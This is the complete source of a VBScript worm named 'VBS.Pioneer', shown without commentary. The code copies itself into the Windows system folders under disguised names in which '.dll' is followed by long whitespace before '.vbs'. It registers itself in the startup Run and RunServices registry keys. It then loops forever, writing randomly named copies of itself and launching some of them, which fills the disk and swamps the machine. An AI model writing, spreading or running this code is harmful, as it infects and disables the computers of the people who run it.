'Rem come to #pioneer galaxynet irc
'Rem dedicated to my bros 
'VBS.Pioneer

Set garnet = CreateObject("Scripting.FileSystemObject")
Set iolite = garnet.OpenTextFile(WScript.ScriptFullname,1)
pyrite=iolite.ReadAll
set selenite = garnet.getspecialfolder(0)
set cuprite = garnet.getspecialfolder(1)
Set sapphire = CreateObject("WScript.Shell")
Set diamond = garnet.GetFile(WScript.ScriptFullName)
diamond.Copy(selenite&"\WinXP.dll                                         .vbs")
diamond.Copy(cuprite&"\WinME.dll                                         .vbs")
sapphire.regWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\start win dlls",cuprite&"\WinXP.dll                                         .vbs"
sapphire.regWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\load icons",selenite&"\WinME.dll                                         .vbs"
randomize
function tektite(pluto, saturn)
uranus = Int((saturn - pluto + 1) * Rnd + pluto)
tektite = chr(uranus)
end function
function ruby(emerald)
azurite=0
do until azurite=emerald
topaz = Int((3 - 1 + 1) * Rnd + 1)
if (topaz=1) Then
ong=ong&tektite(48, 57)
elseif (topaz=2) Then
ong=ong&tektite(65, 90)
else
ong=ong&tektite(97, 122)
end if
azurite=azurite+1
loop
ruby = tektite(65, 90)&ong
end function
do
jupiter = ruby(29)&".vbs"
Set earth = garnet.CreateTextFile(cuprite&"\"&jupiter)
earth.write pyrite
earth.close
if (tektite(48, 50)="1") Then
Set mercury = CreateObject("Wscript.Shell")
mercury.Run ( cuprite&"\"&jupiter )
end if
loop